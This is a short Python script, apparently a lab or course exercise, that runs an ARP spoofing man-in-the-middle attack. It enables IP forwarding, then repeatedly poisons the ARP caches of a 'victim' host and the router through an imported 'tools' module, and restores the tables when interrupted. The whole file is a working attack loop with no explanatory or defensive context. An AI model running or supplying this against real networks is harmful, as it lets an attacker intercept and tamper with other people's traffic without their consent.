import tools as t
import time

VICTIM_IP = "10.0.2.8"
ROUTER_IP = "10.0.2.1"


t.enable_ip_forwarding()

sent_packets_count = 0

try:
    while True:
        t.spoof(VICTIM_IP, ROUTER_IP)
        t.spoof(ROUTER_IP, VICTIM_IP)
        sent_packets_count += 1
        print(f"\r[+] Sent {sent_packets_count} packets.", end="") # a dynamic effect on the console
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...............")
    t.restore(VICTIM_IP, ROUTER_IP)   
    t.restore(ROUTER_IP, VICTIM_IP) 
    print("  [-] Resetting ARP Tables....Quitting.")